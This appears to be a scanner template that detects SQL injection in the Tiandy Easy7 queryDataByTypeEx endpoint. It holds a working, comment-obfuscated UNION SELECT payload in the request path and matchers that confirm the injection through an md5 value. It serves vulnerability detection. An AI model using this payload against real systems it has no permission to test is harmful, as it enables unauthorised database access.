id: poc-yaml-tiandy-easy7-imp-querydatabytypeex-sqli
info:
  name: Tiandy Easy7 queryDataByTypeEx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/md5({{t1}}),1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"content\":"
          - "作案时机"
          - "{{t2}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
